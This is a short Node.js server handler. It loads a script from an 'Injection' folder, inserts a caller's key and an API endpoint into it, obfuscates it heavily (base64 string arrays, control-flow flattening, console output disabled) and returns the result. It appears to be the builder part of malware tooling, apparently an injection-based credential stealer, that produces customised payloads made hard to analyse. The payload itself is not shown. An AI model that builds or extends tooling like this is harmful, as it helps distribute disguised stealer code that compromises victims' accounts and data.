const fs = require('fs');
const JavaScriptObfuscator = require('javascript-obfuscator');
const API = ''; //Your API link

module.exports = async (req, res) => {
    const { key } = req.body
    if (!key) return;
    let data = fs.readFileSync('./Src/Injection/index2.js').toString()
    let replaced = data.replace("%KEY%", key).replace('%API%', API)
    var obfuscationResult = JavaScriptObfuscator.obfuscate(replaced,
        {
            "ignoreRequireImports": true,
            "compact": true,
            "controlFlowFlattening": true,
            "controlFlowFlatteningThreshold": 0.5,
            "deadCodeInjection": false,
            "deadCodeInjectionThreshold": 0.01,
            "debugProtection": false,
            "debugProtectionInterval": 0,
            "disableConsoleOutput": true,
            "identifierNamesGenerator": "hexadecimal",
            "log": true,
            "numbersToExpressions": false,
            "renameGlobals": false,
            "selfDefending": false,
            "simplify": true,
            "splitStrings": false,
            "splitStringsChunkLength": 5,
            "stringArray": true,
            "stringArrayEncoding": ["base64"],
            "stringArrayIndexShift": true,
            "stringArrayRotate": false,
            "stringArrayShuffle": false,
            "stringArrayWrappersCount": 5,
            "stringArrayWrappersChainedCalls": true,
            "stringArrayWrappersParametersMaxCount": 5,
            "stringArrayWrappersType": "function",
            "stringArrayThreshold": 1,
            "transformObjectKeys": false,
            "unicodeEscapeSequence": false
        }
    );
    let output = obfuscationResult.getObfuscatedCode();
    return res.send(output)
}
